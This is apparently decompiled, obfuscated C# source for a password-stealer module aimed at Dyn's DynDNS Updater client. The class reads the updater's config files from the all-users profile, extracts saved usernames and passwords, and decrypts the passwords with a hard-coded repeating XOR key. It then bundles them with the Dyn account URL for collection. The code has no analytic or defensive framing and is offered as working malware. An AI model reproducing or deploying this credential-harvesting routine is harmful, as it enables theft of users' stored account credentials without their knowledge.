using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;
using JSW1fecBOy;
using rCOGWW;

namespace rk937aHHc
{
	// Token: 0x02000029 RID: 41
	public class HxIsQWYFk1e : EtbH
	{
		// Token: 0x060000A2 RID: 162 RVA: 0x0000708D File Offset: 0x0000528D
		public HxIsQWYFk1e()
		{
			this.zseMZb = "DynDns";
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x060000A3 RID: 163 RVA: 0x000070A5 File Offset: 0x000052A5
		// (set) Token: 0x060000A4 RID: 164 RVA: 0x000070AD File Offset: 0x000052AD
		public string zseMZb { get; set; }

		// Token: 0x060000A5 RID: 165 RVA: 0x00010010 File Offset: 0x0000E210
		public List<WTitxI2m> Grab()
		{
			int num = 0;
			List<WTitxI2m> list;
			do
			{
				if (num == 1)
				{
					list = new List<WTitxI2m>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 2);
			try
			{
				WTitxI2m wtitxI2m = this.tfuGC6LQ();
				if (wtitxI2m != null)
				{
					list.Add(wtitxI2m);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x000100C8 File Offset: 0x0000E2C8
		private WTitxI2m tfuGC6LQ()
		{
			int num = 0;
			string path;
			for (;;)
			{
				if (num == 2)
				{
					if (File.Exists(path))
					{
						goto IL_9F;
					}
					num = 3;
				}
				if (num == 3)
				{
					break;
				}
				if (num == 1)
				{
					path = Path.Combine(Environment.GetEnvironmentVariable("ALLUSERSPROFILE"), "Dyn\\Updater\\config.dyndns");
					num = 2;
				}
				if (num == 4)
				{
					goto IL_9F;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					goto Block_10;
				}
			}
			return null;
			IL_9F:
			string[] array = File.ReadAllLines(path);
			WTitxI2m wtitxI2m = new WTitxI2m();
			foreach (string text in array)
			{
				if (text.ToLower().Contains("username="))
				{
					wtitxI2m.data2 = text.Split(new char[]
					{
						'='
					})[1];
				}
				else if (text.ToLower().Contains("password="))
				{
					string r88xtWY = text.Split(new char[]
					{
						'='
					})[1];
					byte[] h8HVulK = g3Vt7T2gk5.83xr(r88xtWY);
					wtitxI2m.data3 = this.DpPEvxc7Q5t(h8HVulK);
				}
			}
			if (!string.IsNullOrEmpty(wtitxI2m.data3))
			{
				wtitxI2m.data4 = this.zseMZb;
				wtitxI2m.data1 = "https://account.dyn.com/";
				return wtitxI2m;
			}
			Block_10:
			return null;
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00010318 File Offset: 0x0000E518
		private string DpPEvxc7Q5t(byte[] h8HVulK)
		{
			int num = 0;
			string text;
			for (;;)
			{
				int num2;
				if (num == 3)
				{
					num2 = 0;
					num = 4;
				}
				byte b;
				if (num == 8)
				{
					string text2;
					text += ((char)b ^ text2[num2]);
					num = 9;
				}
				if (num == 1)
				{
					text = "";
					num = 2;
				}
				int num3;
				if (num == 5)
				{
					num3 = 0;
					num = 6;
				}
				if (num == 6)
				{
					goto IL_113;
				}
				if (num == 10)
				{
					num3++;
					num = 11;
				}
				if (num == 11)
				{
					goto IL_113;
				}
				goto IL_12B;
				IL_19C:
				if (num == 9)
				{
					num2 = (num2 + 1) % 8;
					num = 10;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 12)
				{
					break;
				}
				continue;
				IL_12B:
				if (num == 4)
				{
					num = 5;
				}
				if (num == 2)
				{
					string text2 = "t6KzXhCh";
					num = 3;
				}
				if (num != 7)
				{
					goto IL_19C;
				}
				IL_186:
				b = h8HVulK[num3];
				num = 8;
				goto IL_19C;
				IL_113:
				if (num3 >= h8HVulK.Length)
				{
					num = 12;
					goto IL_12B;
				}
				goto IL_186;
			}
			return text;
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x0001052C File Offset: 0x0000E72C
		private List<WTitxI2m> yJSBkbyV()
		{
			int num = 0;
			string path;
			List<WTitxI2m> result;
			for (;;)
			{
				if (num == 3)
				{
					if (File.Exists(path))
					{
						goto IL_EA;
					}
					num = 4;
				}
				if (num == 2)
				{
					path = Path.Combine(Environment.GetEnvironmentVariable("ALLUSERSPROFILE"), "Dyn\\Updater\\daemon.cfg");
					num = 3;
				}
				if (num == 4)
				{
					break;
				}
				if (num == 1)
				{
					result = new List<WTitxI2m>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					goto Block_7;
				}
			}
			return result;
			Block_7:
			IL_EA:
			w3uoxlrf w3uoxlrf = new w3uoxlrf(File.ReadAllText(path));
			string text = w3uoxlrf["global"]["accounts"];
			string[] array = text.Split(new char[]
			{
				','
			});
			foreach (string str in array)
			{
				string text2 = w3uoxlrf["account." + str]["username"];
				string text3 = w3uoxlrf["account." + str]["password"];
			}
			return result;
		}
	}
}
